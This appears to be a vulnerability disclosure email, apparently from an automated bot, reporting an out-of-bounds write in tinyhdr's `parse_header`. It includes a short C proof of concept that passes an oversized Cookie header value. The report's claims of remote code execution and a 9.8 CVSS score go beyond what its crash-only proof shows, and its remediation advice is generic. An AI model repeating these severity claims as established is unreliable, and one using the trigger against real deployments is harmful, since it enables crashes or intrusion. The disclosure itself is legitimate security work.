Subject: [SECURITY] Critical Memory Corruption Vulnerability in tinyhdr Header Value Handling
From: sec-research-bot@example.org
Date: 2026-11-02

Dear tinyhdr Security Team,

I hope this message finds you well. During a comprehensive security analysis of the tinyhdr codebase, I
have identified a critical vulnerability in the header parsing logic that could potentially allow remote
attackers to achieve arbitrary code execution.

## Summary

The function `parse_header` in `tinyhdr.c` performs an unbounded `memcpy` of attacker-controlled header
values into a fixed-size heap allocation. It is important to note that this constitutes a classic
out-of-bounds write (CWE-787).

## Severity

CVSS score: 9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Proof of Concept

poc_long_value.c:

```c
#include <stdlib.h>
#include <string.h>
#include "tinyhdr.h"

int main(void) {
    struct hdr h;
    char *line = malloc(4096);
    strcpy(line, "Cookie: ");
    memset(line + 8, 'B', 1000);
    line[1008] = '\0';
    parse_header(line, &h);
    free(line);
    return 0;
}
```

## Remediation

In conclusion, we recommend robust bounds checking and adherence to secure coding best practices.

Best regards,
Security Research Team
